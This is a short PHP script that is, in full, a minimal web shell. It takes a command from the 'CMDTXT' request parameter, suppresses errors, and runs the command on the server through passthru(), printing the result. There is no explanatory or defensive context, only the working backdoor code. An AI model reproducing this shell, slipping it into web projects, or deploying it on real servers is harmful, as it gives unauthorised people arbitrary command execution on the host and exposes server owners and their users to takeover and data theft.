<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
if($cmdCommand != '') 
	print passthru($cmdCommand);
	
?>
